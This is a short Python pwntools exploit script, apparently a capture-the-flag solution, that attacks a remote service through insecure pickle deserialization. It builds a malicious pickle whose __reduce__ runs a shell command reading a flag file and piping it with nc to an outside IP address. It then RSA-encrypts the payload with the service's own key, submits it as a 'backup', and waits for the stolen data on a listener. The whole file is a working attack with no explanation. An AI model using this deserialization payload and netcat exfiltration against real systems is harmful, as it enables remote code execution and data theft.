import os
import pickle
import rsa
import re
from pwn import *


class Exploit(object):
    def __reduce__(self):
        comm = "(cd home/admin;cat flag) | (nc 140.114.195.92 1234)"
        return (os.system, (comm,))


def main():
    l = listen(port=1234)
    s = remote('140.113.194.85', 49167)
    print s.recvuntil('6) Show the key\n')
    s.send('6\n')
    key = s.recvuntil(')')
    key = re.findall("(\d*, \d*)", key)
    if key != []:
        key = key[0].split(',')
        fake = rsa.encrypt(pickle.dumps(Exploit()), rsa.PublicKey(int(key[0]), int(key[1]))).encode('base64').replace('\n', '')
        print s.recvuntil('6) Show the key\n')
        s.send('5\n')
        print s.recvuntil('Paste your backup here: ')
        s.send(fake+'\n')
        print l.wait_for_connection().recv()

if __name__ == '__main__':
    main()
